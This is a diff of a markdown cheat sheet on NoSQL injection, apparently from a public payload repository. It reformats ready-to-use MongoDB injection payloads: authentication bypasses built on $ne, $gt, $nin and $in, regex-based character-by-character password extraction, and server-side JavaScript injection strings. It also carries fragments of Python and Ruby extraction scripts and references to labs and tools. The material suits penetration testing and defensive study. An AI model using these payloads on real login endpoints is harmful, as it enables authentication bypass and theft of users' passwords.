@@ -22,62 +22,62 @@
 * [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
 * [Burp-NoSQLiScanner - Plugin available in burpsuite](https://github.com/matrix/Burp-NoSQLiScanner)  
 
+
 ## Exploit
 
 ### Authentication Bypass
 
 Basic authentication bypass using not equal ($ne) or greater ($gt)
 
-```json
-in DATA
-username[$ne]=toto&password[$ne]=toto
-login[$regex]=a.*&pass[$ne]=lol
-login[$gt]=admin&login[$lt]=test&pass[$ne]=1
-login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+* in HTTP data
+  ```ps1
+  username[$ne]=toto&password[$ne]=toto
+  login[$regex]=a.*&pass[$ne]=lol
+  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+  ```
 
-in JSON
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
-{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
-{"username": {"$gt":""}, "password": {"$gt":""}}
-```
+* in JSON data
+  ```json
+  {"username": {"$ne": null}, "password": {"$ne": null}}
+  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+  {"username": {"$gt":""}, "password": {"$gt":""}}
+  ```
+
 
 ### Extract length information
 
-```json
+```ps1
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
 ### Extract data information
 
-```json
-in URL
-username[$ne]=toto&password[$regex]=m.{2}
-username[$ne]=toto&password[$regex]=md.{1}
-username[$ne]=toto&password[$regex]=mdp
+Extract data with "`$regex`" query operator.
 
-username[$ne]=toto&password[$regex]=m.*
-username[$ne]=toto&password[$regex]=md.*
+* HTTP data
+  ```ps1
+  username[$ne]=toto&password[$regex]=m.{2}
+  username[$ne]=toto&password[$regex]=md.{1}
+  username[$ne]=toto&password[$regex]=mdp
 
-in JSON
-{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
-```
+  username[$ne]=toto&password[$regex]=m.*
+  username[$ne]=toto&password[$regex]=md.*
+  ```
 
-Extract data with "in"
+* JSON data
+  ```json
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+  ```
+
+Extract data with "`$in`" query operator.
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
-```
-
-### SSJI 
-
-```json
-';return 'a'=='a' && ''=='
-";return 'a'=='a' && ''=='
-0;return true
 ```
 
 
@@ -85,7 +85,7 @@ Extract data with "in"
 
 ### POST with JSON body
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -111,7 +111,7 @@ while True:
 
 ### POST with urlencoded body
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -160,7 +160,7 @@ while True:
         password += c
 ```
 
-ruby script:
+Ruby script:
 
 ```ruby
 require 'httpx'
@@ -187,6 +187,7 @@ while true
 end
 ```
 
+
 ## MongoDB Payloads
 
 ```bash
@@ -212,6 +213,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 0;return true
 ```
 
+
 ## References
 
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
@@ -219,3 +221,4 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 * [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
 * [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
 * [Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+* [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
